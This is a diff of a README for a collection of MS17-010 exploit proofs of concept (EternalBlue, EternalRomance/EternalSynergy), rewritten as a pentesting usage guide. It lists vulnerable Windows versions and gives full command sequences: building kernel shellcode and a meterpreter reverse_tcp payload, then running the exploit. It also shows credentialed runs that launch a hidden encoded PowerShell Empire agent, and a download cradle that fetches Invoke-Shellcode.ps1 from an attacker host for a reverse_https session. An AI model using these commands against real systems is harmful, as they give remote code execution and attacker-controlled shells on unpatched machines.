@@ -1,42 +1,61 @@
-# MS17-010
+# MS17-010 RCE PoC's
 
-This repository is for public my work on MS17-010. I have no plan to do any support. **All support issues will not get response from me**.
+All credits go out to [worawit](https://github.com/worawit/MS17-010). I've just added some usage clarifications and made them more usable for pentesting purposes.
 
-## Files
+## Eternalblue
 
- * **BUG.txt** MS17-010 bug detail and some analysis
- * **eternalblue_exploit7.py** Eternalblue exploit for windows 7/2008
- * **eternalblue_exploit8.py** Eternalblue exploit for windows 8/2012 x64
- * **eternalblue_poc.py** Eternalblue PoC for buffer overflow bug
- * **eternalblue_kshellcode_x64.asm** x64 kernel shellcode for my Eternalblue exploit. This shellcode should work on Windows Vista (maybe XP) and later 
- * **eternalblue_kshellcode_x86.asm** x86 kernel shellcode for my Eternalblue exploit. This shellcode should work on Windows Vista (maybe XP) and later
- * **eternalblue_sc_merge.py** Script for merging eternalblue x86 and x64 shellcode. Eternalblue exploit, that support both x86 and x64, with merged shellcode has no need to detect a target architecture
- * **eternalchampion_leak.py** Eternalchampion PoC for leaking info part
- * **eternalchampion_poc.py** Eternalchampion PoC for controlling RIP
- * **eternalchampion_poc2.py** Eternalchampion PoC for getting code execution
- * **eternalromance_leak.py** Eternalromance PoC for leaking info part
- * **eternalromance_poc.py** Eternalromance PoC for OOB write
- * **eternalromance_poc2.py** Eternalromance PoC for controlling a transaction which leading to arbitrary read/write
- * **eternalsynergy_leak.py** Eternalsynergy PoC for leaking info part
- * **eternalsynergy_poc.py** Eternalsynergy PoC for demonstrating heap spraying with large paged pool
- * **infoleak_uninit.py** PoC for leaking info from uninitialized transaction data buffer
- * **mysmb.py** Extended Impacket SMB class for easier to exploit MS17-010 bugs
- * **npp_control.py** PoC for controlling nonpaged pool allocation with session setup command
- * **zzz_exploit.py** Exploit for Windows7 and later (x64 only and requires access to named pipe)
+Eternalblue only requires access to IPC$ to exploit a target while other exploits require access to a named pipe as well. Eternalblue thus works on all versions of Windows that allow anonymous access to IPC$ (Windows 7 and Windows 2008, or later version explicitly configured to allow anonymous access). Keep in mind that Eternalblue has a higher change of crashing a target than Eternalsynergy - Eternalromance.
 
+#### Compatible targets
 
-## Anonymous user
+**eternalblue_exploit7:**
 
-Anonymous user (null session) get more restriction on default settings of new Windows version. To exploit Windows SMB without authentication, below behavior should be aware.
+- Windows 7 SP1 x64
+- Windows 2008 R2 SP1 x64
+- Windows 7 SP1 x86
+- Windows 2008 SP1 x86
 
-* Since Windows Vista (maybe Windows 2003 SPx), default settings does not allow anonymous to access any named pipe
-* Since Windows 8, default settings does not allow anonymous to access IPC$ share (IPC$ might be acessible but cannot do much)
+**eternalblue_exploit8:**
+
+- Windows 2012 R2 x64
+- Windows 8.1 x64
+
+#### Exploit usage
+
+Example for spawning a meterpreter session on an x64 machine:
+
+1. `nasm -f bin eternalblue_kshellcode_x64.asm`
+2. `msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o meterpreter_msf.bin EXITFUNC=thread LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT>`
+3. `cat eternalblue_kshellcode_x64 meterpreter_msf.bin > sc_x64.bin`
+4. `python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin`
 
 
-## About NSA exploits
+## Eternalsynergy - Eternalromance
 
-* **Eternalblue** requires only access to IPC$ to exploit a target while other exploits require access to named pipe too. So the exploit always works against Windows < 8 in all configuration (if tcp port 445 is accessible). However, Eternalblue has a chance to crash a target higher than other exploits.
-* **Eternalchampion** requires access to named pipe. The exploit has no chance to crash a target.
-* **Eternalromance** requires access to named pipe. The exploit can target Windows < 8 because the bug for info leak is fixed in Windows 8. The exploit should have a chance to crash a target lower than Eternalblue. I never test a reliable of the exploit.
-* **Eternalsynergy** requires access to named pipe. I believe this exploit is modified from Eternalromance to target Windows 8 and later. Eternalsynergy uses another bug for info leak and does some trick to find executable memory (I do not know how it works because I read only output log and pcap file).
+This exploit exploits the same bug used by NSA's Eternalromance and Eternalsynergy. A named pipe is needed, meaning on more modern (default) configurations you will need credentials in order for the exploit to work. In most cases, domain user credentials will suffice. 
+
+#### Compatible targets
+
+x64 architecture only
+
+- Windows 2016 x64
+- Windows 2012 R2 x64
+- Windows 8.1 x64
+- Windows 2008 R2 SP1 x64
+- Windows 7 SP1 x64
+
+#### Usage
+
+Usage: 
+`python eternalsynergy_romance.py <target_ip_address> <named_pipe> <DOMAIN\username> <password> <command_to_execute>`
+
+Example for spawning an Empire agent:
+`python eternalsynergy_romance.py 192.168.178.2 netlogon WORKGROUP\testuser !Password123 "powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAUwB0AEUAbQAuAE4AZQBUAC..."`
+
+Example for spawning a meterpreter session:
+`python zzz_exploit2.py 192.168.178.26 netlogon "powershell -Exec ByPass -NoP -noexit \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.25/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.178.25 -Lport 8443 -Force \""`
+
+(I typically grab Invoke-Shellcode.ps1 from http://bit.ly/2cuWJTF, but that only works when the target has an unfiltered outbound connection.)
+
+
 
